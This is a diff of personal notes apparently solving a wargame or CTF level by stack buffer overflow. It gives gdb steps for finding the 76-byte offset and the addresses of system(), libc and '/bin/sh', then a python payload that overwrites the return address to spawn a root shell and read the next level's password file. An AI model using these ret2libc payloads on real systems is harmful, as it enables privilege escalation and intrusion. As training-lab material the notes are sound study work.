@@ -62,9 +62,27 @@ gdb> info function ret <- than to find address of ret
 gdb> info function system <- than to find address of system.
 
 
+   0x08048538 <+100>:   call   0x80483e0 <strdup@plt> <-- 1. overflow strdup + 4 bytes to go to ret func
+   0x0804853d <+105>:   leave                         <-- 2. miss this step
+   0x0804853e <+106>:   ret                           <-- 3. write ret address
+   than to launch ret function.
 
-python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x0\x33\x48\x08" + "b" * 4 + "\x35\xf9\xff\xbf"' > /tmp/breaker2
+ After it finding with own main.c address of function system of libc 0xb7e6b060 
 
+int     main(int argc, char **argv)
+{
+        system();
+        printf("%s is at %p\n", argv[1], getenv(argv[1]));
+        return (0);
+}
+
+"\x3e\x85\x04\x08" - is return func
+"\x60\xb0\xe6\xb7" - is addr of system func which start machine with root rights.
+"b" * 4 
+"\x3c\x9f\xff\xbf"
+python -c 'print "a" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "DUMM" + "\x3c\x9f\xff\xbf"' > /tmp/breaker2
+
+0x08048360 - system
 cat /tmp/breaker2 - | ./level2
 
 cat /home/user/level3/.pass
@@ -72,3 +90,21 @@ cat /home/user/level3/.pass
 0x8048330
 
 ! Узнать адрес ret, system и собственного шеллкода, который закинули в env, а затем заполнить стэк? заменить рет на систем команду, затем заполнить еще 4 байта и вызывать шелл код
+
+
+
+At first we decide to overflow array with letters more than 76 than to find place where programm call SIGSEGV
+Launch programm with gdb
+- (gdb) r < <(echo 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ')
+put this string with other letters.
+And we are seeing sigsev in address
+- Program received signal SIGSEGV, Segmentation fault.
+- 0x55555555 in ?? ()
+And when we print this 0x55555555, we see that sigsev was in letter 'U'
+- (gdb) p (char)0x55555555
+- $6 = 85 'U'
+Therefore we found that programms offset 76 cells + 4 bites for address.
+Next step is to find address of system and libc
+0xb7e6b060 - system
+0xb7e2c000 - libc
+0xb7f8cc58 - "bin/sh"
